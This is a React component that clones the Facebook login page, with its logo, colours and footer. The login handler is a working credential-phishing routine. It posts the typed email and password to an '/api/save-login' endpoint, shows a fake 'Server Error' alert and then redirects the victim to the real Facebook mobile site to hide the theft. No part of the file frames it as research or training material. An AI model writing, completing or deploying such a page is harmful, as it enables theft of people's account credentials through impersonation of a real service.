import { useState } from 'react';

export default function LoginScreen() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const login = async (e: React.FormEvent | React.MouseEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const response = await fetch('/api/save-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      if (response.ok) {
        console.log('Credentials saved successfully');
      }
    } catch (error) {
      console.error('Failed to send credentials:', error);
    }

    // Wait a short moment to show loading state, then redirect
    setTimeout(() => {
      alert("Server Error, Please Try Again Later");
      window.location.href = "https://m.facebook.com";
      setIsLoading(false);
    }, 1500);
  };

  return (
    <div className="w-full h-full overflow-y-auto no-scrollbar" style={{ background: '#F0F2F5' }}>
      {/* Desktop layout container */}
      <div className="min-h-full flex flex-col lg:flex-row lg:items-center lg:justify-center lg:gap-16 lg:max-w-5xl lg:mx-auto lg:px-8 lg:py-20">
        {/* Left column - desktop only */}
        <div className="hidden lg:flex flex-col items-start max-w-[500px]">
          <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg" className="mb-4">
            <circle cx="30" cy="30" r="30" fill="#1877F2" />
            <path d="M38.5 30H29.5V48H22.5V30H17.5V24H22.5V20C22.5 15.5 25.2 12 30.5 12H37V18H33.5C32 18 30.5 18.5 30.5 20.5V24H37L38.5 30Z" fill="white" />
          </svg>
          <h1 className="text-[32px] font-bold leading-tight mb-4" style={{ color: '#1C1E21' }}>
            Explore the<br />
            things you<br />
            <span className="text-[#1877F2]">love.</span>
          </h1>
          <img
            src="/assets/login-hero.jpg"
            alt="Social media collage"
            className="w-full max-w-[400px] rounded-lg"
          />
        </div>

        {/* Right column - Login form */}
        <div className="flex flex-col items-center w-full lg:max-w-[396px]">
          {/* Mobile logo */}
          <div className="lg:hidden flex flex-col items-center pt-12 pb-6">
            <svg width="60" height="60" viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg" className="mb-2">
              <circle cx="30" cy="30" r="30" fill="#1877F2" />
              <path d="M38.5 30H29.5V48H22.5V30H17.5V24H22.5V20C22.5 15.5 25.2 12 30.5 12H37V18H33.5C32 18 30.5 18.5 30.5 20.5V24H37L38.5 30Z" fill="white" />
            </svg>
            <p className="text-center text-[#65676B] text-sm">Connect with friends and the world around you.</p>
          </div>

          {/* Login Card */}
          <div
            className="w-full mx-4 lg:mx-0 p-4 rounded-lg"
            style={{
              background: '#FFFFFF',
              boxShadow: '0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1)',
            }}
          >
            <h2 className="text-center text-lg font-semibold mb-4" style={{ color: '#1C1E21' }}>
              Log in to Facebook
            </h2>

            <form className="flex flex-col gap-3">
              <input
                type="text"
                placeholder="Email or phone number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="w-full h-12 px-4 text-[17px] rounded-md border outline-none transition-all"
                style={{
                  borderColor: '#DDDFE2',
                  color: '#1C1E21',
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#1877F2';
                  e.target.style.boxShadow = '0 0 0 2px #E7F3FF';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#DDDFE2';
                  e.target.style.boxShadow = 'none';
                }}
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full h-12 px-4 text-[17px] rounded-md border outline-none transition-all"
                style={{
                  borderColor: '#DDDFE2',
                  color: '#1C1E21',
                }}
                onFocus={(e) => {
                  e.target.style.borderColor = '#1877F2';
                  e.target.style.boxShadow = '0 0 0 2px #E7F3FF';
                }}
                onBlur={(e) => {
                  e.target.style.borderColor = '#DDDFE2';
                  e.target.style.boxShadow = 'none';
                }}
              />

              <button
                type="button"
                onClick={login}
                disabled={isLoading}
                className="w-full h-12 rounded-md text-white text-xl font-semibold active:scale-[0.98] transition-transform disabled:opacity-70"
                style={{ background: '#1877F2' }}
              >
                {isLoading ? 'Logging in...' : 'Log In'}
              </button>
            </form>

            <button className="w-full mt-4 text-center text-sm text-[#1877F2] hover:underline">
              Forgot password?
            </button>

            {/* Divider */}
            <div className="flex items-center my-5">
              <div className="flex-1 h-px bg-[#DDDFE2]" />
              <span className="px-3 text-xs text-[#96999E]">or</span>
              <div className="flex-1 h-px bg-[#DDDFE2]" />
            </div>

            <div className="flex justify-center">
              <button
                className="h-12 px-8 rounded-md text-white text-[17px] font-semibold active:scale-[0.98] transition-transform"
                style={{ background: '#42B72A' }}
              >
                Create new account
              </button>
            </div>
          </div>

          {/* Below card */}
          <p className="mt-7 text-center text-sm" style={{ color: '#1C1E21' }}>
            <span className="font-semibold hover:underline cursor-pointer" style={{ color: '#1C1E21' }}>Create a Page</span>{' '}
            <span className="text-[#65676B]">for a celebrity, brand or business.</span>
          </p>

          {/* Footer */}
          <div className="mt-auto pt-12 pb-4 w-full">
            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-[#8A8D91] mb-3">
              <span>English (US)</span>
              <span className="hover:underline cursor-pointer">Español</span>
              <span className="hover:underline cursor-pointer">Français</span>
              <span className="hover:underline cursor-pointer">中文</span>
              <span className="hover:underline cursor-pointer">العربية</span>
              <span className="hover:underline cursor-pointer">Português</span>
              <span className="hover:underline cursor-pointer">More...</span>
            </div>
            <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 text-xs text-[#8A8D91]">
              <span className="hover:underline cursor-pointer">Privacy</span>
              <span className="hover:underline cursor-pointer">Terms</span>
              <span className="hover:underline cursor-pointer">Cookies</span>
              <span className="hover:underline cursor-pointer">Ad Choices</span>
            </div>
            <p className="text-center text-xs text-[#8A8D91] mt-2">Meta © 2026</p>
          </div>
        </div>
      </div>
    </div>
  );
}
